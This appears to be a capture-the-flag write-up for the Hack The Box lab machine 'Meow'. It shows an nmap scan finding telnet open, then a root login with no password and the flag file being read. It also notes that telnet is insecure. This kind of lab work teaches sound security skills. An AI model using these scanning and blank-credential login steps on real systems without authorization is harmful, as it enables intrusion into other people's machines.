# Meow

- **Difficulty:** Very easy

## 🔎 Solution
I connected to the target machine via the VPN using the usual OpenVPN command:
```
sudo openvpn <file.ovpn>
```

Back on the Hack The Box page I selected **Spawn Machine** and noted the target IP address. 
With the IP in hand I ran an `nmap` scan and discovered that **port 23 (telnet)** was open:
```
> nmap 10.129.232.240

PORT   STATE SERVICE
23/tcp open  telnet
```

A quick note about **Telnet**: it is a simple, legacy protocol that provides a plaintext, interactive remote terminal over TCP. 
It's useful for quick access or testing, but because it sends everything unencrypted (including credentials), it should not be used on untrusted networks for sensitive administration - SSH is the modern, secure alternative.

To connect I used the telnet client:
```
telnet <IP address>
```

The service responded with a banner and a login prompt:
```
> telnet 10.129.232.240
Trying 10.129.232.240...
Connected to 10.129.232.240.
Escape character is '^]'.

Meow login: 
```

I tried logging in as `root` and was granted access without a password. 
Once on the shell I listed the directory contents with `ls` and found `flag.txt`.
```
root@Meow:~# ls
flag.txt  snap
```

Viewing the file revealed the flag.
```
root@Meow:~# cat flag.txt
